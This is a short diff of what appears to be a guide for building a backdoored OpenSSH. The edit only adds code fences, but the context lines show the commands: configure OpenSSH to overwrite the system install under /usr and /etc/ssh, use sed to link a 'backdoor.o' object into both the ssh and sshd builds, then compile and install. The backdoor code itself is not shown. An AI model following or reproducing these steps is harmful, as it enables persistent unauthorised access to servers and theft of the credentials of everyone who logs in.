@@ -33,9 +33,11 @@ yum -y install zlib-devel openssl-devel pam-devel
 #Notice: Confirm the location of the original openssh and configure files installed. It's important for command ./configure --prefix   
 ./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5   
 
-#### add backdoor.o to Makefile   
+#### add backdoor.o to Makefile  
+``` 
 sed -i 's/ssh\.o/ssh\.o backdoor\.o/' Makefile   
 sed -i 's/sshd\.o/sshd\.o backdoor\.o/' Makefile   
+```
 
 #### compile and install   
 make   
